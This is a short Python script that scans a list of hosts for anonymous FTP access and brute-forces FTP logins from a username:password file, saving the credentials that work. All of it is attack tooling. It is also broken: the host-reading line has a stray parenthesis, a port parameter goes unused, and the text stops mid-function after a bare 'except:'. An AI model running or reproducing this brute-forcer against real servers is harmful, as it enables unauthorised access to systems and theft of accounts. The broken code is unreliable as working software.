import ftplib
result_list=[]
def find_host_fromfile(filename,port):   #filename str,port str
    f = open(filename, 'r')
    for line in f.readlines():
        yield  line.split('\t')[0])
def anonymous_login(ip):   #ip str
        try:
            ftp=ftplib.FTP(ip)
            ftp.login('anonymous',)
            print('%s ftp anonymous login success'%ip)
            return True
        except:
            print('%s ftp anonymous login failed' % ip)
            return False
def ftp_brutelogin(ip,passwd_file):   #ip str,passwd_file,str
    passwd_file=open(passwd_file,'r')
    for line in passwd_file.readlines():
        username=line.split(':')[0]
        password=line.split(':')[1].strip('\r')  # 移除头尾的回车符 \r
        print('tring: %s :%s'%(username,password))
        try:
            ftp=ftplib.FTP(ip)
            ftp.login(username,password)
            print('ftp login success %s:%s'%(username,password))
            result_list.append(ip+'\t'+username+'\t'+password)
            return (None,None)
        except:

